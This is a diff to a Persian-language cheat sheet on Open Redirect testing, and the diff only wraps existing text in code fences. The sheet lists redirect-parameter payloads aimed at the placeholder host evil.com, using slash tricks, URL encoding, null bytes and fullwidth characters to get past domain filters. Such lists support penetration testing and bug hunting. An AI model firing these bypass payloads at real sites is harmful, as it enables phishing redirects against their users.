@@ -56,25 +56,26 @@ http://victim.com/page?redirect=https://evil.com%2F%5C
 
 نکته مهم درباره payloadهای Open Redirect
 ۱. بسیاری از اپلیکیشنها کنترل میکنند که URL مقصد فقط به دامنههای مشخصی اشاره کند (مثل فقط دامنه داخلی)، پس برای bypass باید گاهی payloadهایی شبیه به اینها استفاده کرد:
-
+```
 http://example.com/redirect?url=//evil.com (دو اسلش بدون schema)
 
 http://example.com/redirect?url=/\evil.com
 
 http://example.com/redirect?url=http:///evil.com
-
+```
 استفاده از کدگذاریهای URL (URL encoding): %2F%2Fevil.com
 
 استفاده از کدگذاریهای Unicode یا دور زدن با کاراکترهای Unicode یا کاراکترهای غیرمعمول
 
 ۲. آزمایش با ترکیبی از کدگذاریها و کاراکترهای ویژه:
 
-text
+```
 redirect=https:%2F%2Fevil.com
 redirect=https:/\evil.com
 redirect=////evil.com
 redirect=//evil.com%00
 redirect=//evil.com/
+```
 توصیه من برای payloadهای Open Redirect بروز شده:
 از encoded URL ها استفاده کنید (%3A, %2F, %5C)
 
@@ -83,7 +84,7 @@ redirect=//evil.com/
 از مسیرهای نامتعارف و شیوههای encode و Unicode جهت دور زدن فیلترهای معمول استفاده کنید.
 
 نمونه payloadهای به روز و موثر:
-text
+```
 redirect=https://evil.com
 redirect=//evil.com
 redirect=///evil.com
@@ -96,6 +97,7 @@ redirect=%2F%2F%2Fevil.com
 redirect=https://evil.com%00
 redirect=https://evil.com%2F
 redirect=%EF%BC%8E%EF%BC%8E%2Fevil.com   (دو نقطه fullwidth + اسلش)
+```
 
 ==================================================================
 ## impact:
